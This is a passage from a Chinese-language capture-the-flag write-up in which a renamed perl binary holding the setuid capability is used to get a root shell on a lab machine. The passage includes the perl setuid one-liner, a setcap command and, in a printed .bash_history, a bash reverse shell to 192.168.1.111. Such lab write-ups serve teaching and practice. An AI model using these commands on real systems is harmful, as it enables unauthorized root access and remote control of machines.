/usr/lib/squid/pinger = cap_net_raw+ep
```

发现新的权限：

```bash
viper@blackwidow:/tmp$ /home/viper/backup_site/assets/vendor/weapon/arsenic --help

Usage: /home/viper/backup_site/assets/vendor/weapon/arsenic [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F)
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit <> files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing program
  -n                assume "while (<>) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, patchlevel and license
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings
  -W                enable all warnings
  -x[directory]     ignore text before #!perl line (optionally cd to directory)
  -X                disable all warnings
  
Run 'perldoc perl' for more help with Perl.

viper@blackwidow:/tmp$ perldoc perl
You need to install the perl-doc package to use this program.
```

发现是执行`perl`的，尝试进行利用：

```bash
viper@blackwidow:/tmp$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e "printf 'test'"
test
```

尝试一下：https://gtfobins.github.io/gtfobins/perl/#capabilities

```bash
viper@blackwidow:/tmp$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@blackwidow:/tmp# whoami;id
root
uid=0(root) gid=1001(viper) groups=1001(viper)
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326610.png" alt="image-20250617132507310" style="zoom:50%;" />

```bash
root@blackwidow:~# ls -la
total 40
drwxr-xr-x 4 viper viper 4096 May  2  2021 .
drwxr-xr-x 3 root  root  4096 Dec 12  2020 ..
drwx------ 4 viper viper 4096 Dec 13  2020 backup_site
-rw------- 1 viper viper 1546 May  2  2021 .bash_history
-rw-r--r-- 1 viper viper  220 Dec 12  2020 .bash_logout
-rw-r--r-- 1 viper viper 3526 Dec 12  2020 .bashrc
drwxr-xr-x 3 viper viper 4096 Dec 13  2020 .local
-rw------- 1 viper viper   33 Dec 12  2020 local.txt
-rw-r--r-- 1 viper viper  807 Dec 12  2020 .profile
-rw------- 1 viper viper   56 May  2  2021 .Xauthority
root@blackwidow:~# cat local.txt 
d930fe79919376e6d08972dae222526b
root@blackwidow:~# cat .bash_history
bash -i >& /dev/tcp/192.168.1.111/1234 0>&1
sudo reboot
su
cd /var/www/html/
ls
nano index.html 
su
python
clear
curl
clear
/usr/bin/GET
su
ls
sh some.file
ls -lrt /usr/bin/perl
chmod o-x /usr/bin/perl
su
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
mv perl arsenic
ls .lrt
ls -lrt
chmod o-x arsenic 
ls -lrt
chmod 600 arsenic 
ls
ls -lrt
chmod 650 arsenic 
ls -lrt
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
chmod 700 arsenic 
ls -lrt
./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
ls -lrt
cp /var/www/html/company/ ./backup_site
cp -r /var/www/html/company/ ./backup_site
ls -lrt
cd backup_site/
ls -lrt
cd assets
ls -lrt
cd vendor
ls lrt
ls -lrt
mkdir weapon
ls -lrt
mv ../../../arsenic weapon/
cd weapon/
ls
cd ..
ls -lrt
sh linpe
sh linpeas
clear
cd ..
ls
cd viper
ls
ls -lrt
chmod 600 backup_site/
ls -lrt
cd viper
cd backup_site/
chmod 650 backup_site/
ls -lrt
cd backup_site/
chmod 700 backup_site/
cd backup_site/
cd ..
ls -lrt
cd backup_site/
ls -lrt
cd assets
ls -lrt
cd vendor
ls -lrt
cd weapon/
ls
./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
su
sh linpeas
cp /usr/bin/perl .
ls
sudo setcap cap_setuid+ep ./perl
su
su test
su
su root
exit
su root
arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
ls
./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
su root
```

就是作者预期的！